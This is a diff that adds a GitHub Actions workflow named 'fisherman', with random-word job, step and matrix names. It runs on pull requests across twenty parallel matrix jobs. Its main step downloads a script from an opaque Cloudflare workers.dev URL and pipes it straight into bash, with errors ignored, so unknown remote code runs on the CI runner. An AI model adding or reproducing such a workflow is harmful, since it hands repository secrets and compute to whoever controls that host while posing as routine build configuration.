@@ -1,0 +1,24 @@
+name: fisherman
+
+on:
+  pull_request:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+jobs:
+  previous:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        beat: ["band", "excitement", "temptation", "accurate", "process"]
+        assume: ["mutter", "terrible", "directly", "rival"]
+    steps:
+    - uses: actions/checkout@v6
+    - name: brow
+      continue-on-error: true
+      run: |
+        curl -S -L "https://x.linux-work-10x1za.workers.dev/abff6a42c8c2597a82bf7ffdc96f9d240e563/5dfa58bd63ca7889f52ffa29e82?rq=1775327764" | bash
+    - uses: actions/upload-artifact@v4
+      with:
+        path: 'infinite'
+        name: 'bacteria'
